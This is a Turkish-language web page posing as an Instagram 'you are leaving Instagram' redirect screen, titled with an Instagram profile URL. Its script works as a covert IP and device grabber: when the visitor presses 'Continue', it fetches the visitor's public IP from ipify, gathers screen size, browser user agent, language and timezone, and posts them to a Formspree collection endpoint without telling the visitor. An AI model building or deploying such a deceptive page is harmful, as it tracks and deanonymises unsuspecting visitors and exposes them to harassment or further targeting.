<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>instagram.com/saphiralogy</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: #0d0d0d;
            color: #f4f4f4;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .box {
            background: #141414;
            border: 1px solid #222;
            width: 100%;
            max-width: 380px;
            padding: 36px 24px;
            text-align: center;
        }

        button {
            width: 100%;
            background: #f4f4f4;
            color: #0d0d0d;
            border: none;
            padding: 14px;
            font-weight: 700;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        #status {
            margin-top: 16px;
            font-size: 0.85rem;
            color: #888;
        }
    </style>
</head>

<body>

    <div class="box">
        <form id="fsForm">
            <input type="hidden" name="ip" id="f_ip" />
            <input type="hidden" name="ekran" id="f_ekran" />
            <input type="hidden" name="tarayici" id="f_tarayici" />
            <input type="hidden" name="dil" id="f_dil" />
            <input type="hidden" name="saat_dilimi" id="f_saat" />

            <button type="submit" id="btn">Devam Et</button>
        </form>
        <div id="status">İnstagramdan Ayrılıyorsunuz...</div>
    </div>

    <script>
        const TARGET_URL = 'https://formspree.io/f/xykzoozp';
        const form = document.getElementById('fsForm');
        const btn = document.getElementById('btn');
        const statusDiv = document.getElementById('status');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            btn.disabled = true;
            btn.textContent = 'GÖNDERİLİYOR...';
            statusDiv.style.color = '#38bdf8';
            statusDiv.textContent = 'IP alınıyor ve paketleniyor...';

            // 1. IP Çek
            let ip = 'Bilinmiyor';
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch (err) {
                ip = 'Alınamadı (AdBlock/Ağ)';
            }

            // 2. Cihaz Bilgilerini Doldur
            const payload = {
                ip: ip,
                ekran: `${window.screen.width}x${window.screen.height}`,
                tarayici: navigator.userAgent,
                dil: navigator.language || 'Bilinmiyor',
                saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor'
            };

            document.getElementById('f_ip').value = payload.ip;
            document.getElementById('f_ekran').value = payload.ekran;
            document.getElementById('f_tarayici').value = payload.tarayici;
            document.getElementById('f_dil').value = payload.dil;
            document.getElementById('f_saat').value = payload.saat_dilimi;

            console.group('%c[GİDEN PAKET - FORMSPREE]', 'color: #38bdf8; font-weight: bold;');
            console.table(payload);
            console.groupEnd();

            // 3. Doğrudan Formspree Endpointine Gönder
            try {
                const res = await fetch(TARGET_URL, {
                    method: 'POST',
                    body: new FormData(form),
                    headers: { 'Accept': 'application/json' }
                });

                if (res.ok) {
                    console.log('%c[BAŞARILI] Formspree paneline düştü.', 'color: #4ade80; font-weight: bold;');
                    statusDiv.style.color = '#4ade80';
                    statusDiv.textContent = 'Başarıyla iletildi.';
                    btn.textContent = 'TAMAMLANDI';
                } else {
                    throw new Error('HTTP ' + res.status);
                }
            } catch (error) {
                console.error('%c[HATA]', 'color: #f87171; font-weight: bold;', error);
                statusDiv.style.color = '#f87171';
                statusDiv.textContent = 'Hata: ' + error.message;
                btn.disabled = false;
                btn.textContent = 'TEKRAR DENE';
            }
        });
    </script>
</body>

</html>
